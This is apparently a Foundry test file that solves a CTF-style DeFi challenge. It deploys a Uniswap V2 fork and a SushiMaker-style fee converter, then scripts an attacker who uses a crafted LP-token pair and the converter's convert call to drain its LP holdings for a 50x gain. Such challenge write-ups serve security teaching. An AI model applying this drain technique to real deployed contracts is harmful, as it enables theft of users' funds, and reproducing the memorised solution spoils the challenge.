// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {SafuMakerV2} from "src/free-lunch/SafuMakerV2.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    IUniswapV2Factory safuFactory;
    IUniswapV2Router02 safuRouter;
    IUniswapV2Pair safuPair; // USDC-SAFU trading pair
    IWETH weth;
    Token usdc;
    Token safu;
    SafuMakerV2 safuMaker;

    IUniswapV2Pair attackPair; // safuPair-SAFU trading pair

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0] = admin;
        addresses[1] = attacker;
        amounts[0] = 1_000_000e18;
        amounts[1] = 100e18;
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        vm.prank(admin);
        safu = new Token('SAFU','SAFU');

        addresses[0] = admin;
        addresses[1] = attacker;
        amounts[0] = 1_000_000e18;
        amounts[1] = 100e18;
        vm.prank(admin);
        safu.mintPerUser(addresses, amounts);

        // deploying SafuSwap + SafuMaker contracts
        weth = IWETH(deployCode("src/other/uniswap-build/WETH9.json"));
        safuFactory = IUniswapV2Factory(deployCode("src/other/uniswap-build/UniswapV2Factory.json", abi.encode(admin)));
        safuRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json", abi.encode(address(safuFactory), address(weth))
            )
        );

        vm.prank(admin);
        safuMaker = new SafuMakerV2(
            address(safuFactory),
            0x1111111111111111111111111111111111111111, // sushiBar address, irrelevant for exploit
            address(safu),address(usdc)
        );
        vm.prank(admin);
        safuFactory.setFeeTo(address(safuMaker));

        // --adding initial liquidity
        vm.prank(admin);
        usdc.approve(address(safuRouter), type(uint256).max);
        vm.prank(admin);
        safu.approve(address(safuRouter), type(uint256).max);

        vm.prank(admin);
        safuRouter.addLiquidity(address(usdc), address(safu), 1_000_000e18, 1_000_000e18, 0, 0, admin, block.timestamp);

        // --getting the USDC-SAFU trading pair
        safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc), address(safu)));

        // --simulates trading activity, as LP is issued to feeTo address for trading rewards
        vm.prank(admin);
        safuPair.transfer(address(safuMaker), 10_000e18); // 1% of LP
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        // approving attacker's usdc and safu to safuRouter
        usdc.approve(address(safuRouter), type(uint256).max);
        safu.approve(address(safuRouter), type(uint256).max);

        // obtain usdc-safu LP
        safuRouter.addLiquidity(address(usdc), address(safu), 10e18, 10e18, 0, 0, attacker, block.timestamp);

        // approving attacker's LP
        safuPair.approve(address(safuRouter), type(uint256).max);

        // create a new pair safuPair-safu and take LP for it (call here LP2)
        safuRouter.addLiquidity(address(safuPair), address(safu), 1e18, 100, 0, 0, attacker, block.timestamp);

        // getting the safuPair-SAFU trading pair
        attackPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair), address(safu)));

        // sending some LP2 to safuMaker
        attackPair.transfer(address(safuMaker), attackPair.balanceOf(attacker) / 10); // 10% of LP2

        // convert safuPair to safu, thanks that all safuPair from safuMaker go to the attackPair
        safuMaker.convert(address(safuPair), address(safu));

        // swap safu to safuPair in the attackPair
        address[] memory addresses = new address[](2);
        addresses[0] = address(safu);
        addresses[1] = address(safuPair);

        safuRouter.swapExactTokensForTokens(1e18, 0, addresses, attacker, block.timestamp);

        // removing liquidity for the safuPair
        safuRouter.removeLiquidity(
            address(usdc), address(safu), safuPair.balanceOf(attacker), 0, 0, attacker, block.timestamp
        );

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker has increased both SAFU and USDC funds by at least 50x
        assertGe(usdc.balanceOf(attacker), 5_000e18);
        assertGe(safu.balanceOf(attacker), 5_000e18);
    }
}
